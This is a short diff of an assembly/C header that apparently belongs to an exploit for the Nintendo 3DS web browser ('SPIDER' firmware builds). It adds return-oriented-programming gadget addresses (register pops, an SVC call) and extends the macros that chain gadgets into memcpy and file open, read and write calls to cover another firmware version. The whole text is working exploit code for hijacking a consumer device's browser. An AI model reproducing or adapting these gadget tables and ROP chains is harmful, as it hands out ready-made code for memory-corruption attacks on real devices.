@@ -85,9 +85,12 @@
 	#define LDMFD_SP_R4_5_6_LR_BX_R12	0x0017E764
 	#define LDMFD_SP_R4_5_PC		0x00101418
 	#define LDR_R0_0_POP_R4_PC		0x001CA350
+	#define POP_LR_PC			0x002D5658
 	#define POP_PC				0x0010D954
 	#define POP_R0_1_2_3_4_7_PC		0x00176A27
+	#define POP_R0_PC			0x002AC330
 	#define POP_R1_PC			0x0026A528
+	#define POP_R1_2_3_PC			0x00215984
 	#define POP_R4_5_6_PC			0x00100D24
 	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x00103D3C
 	#define SP_LR_LDMFD_SP_LR_PC		0x002D5654
@@ -95,6 +98,7 @@
 	#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x00333330
 	#define IFile_Open_LDMFD_SP_R4_5_6_7_PC	0x0025BC00
 	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x002FA864
+	#define SVC_0A_BX_LR			0x002A3E84
 	#define DMC				0x002A4C57
 	#define MAGIC				0x002D5640
 	#define ROP_LOC				0x08CF2000
@@ -522,7 +526,7 @@
 	#define rop_memcpy(dst, src, size)	.word POP_LR_PC, POP_PC, POP_R0_PC, dst, POP_R1_2_3_PC, src, size, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR
 	#define rop_file_read(handle, readcount, buffer, size)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, readcount, buffer, size, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC
 	#define rop_file_write(handle, writecount, buffer, size)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, writecount, buffer, size, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC
-	#if defined(SPIDER_4X)
+	#if defined(SPIDER_21) || defined(SPIDER_4X)
 		#define rop_file_open(handle, filename, mode)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, ROP_LOC+filename, mode, GARBAGE, IFile_Open_LDMFD_SP_R4_5_6_7_PC
 	#else
 		#define rop_file_open(handle, filename, mode)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, ROP_LOC+filename, mode, GARBAGE, IFile_Open_LDMFD_SP_R4_5_6_7_8_PC
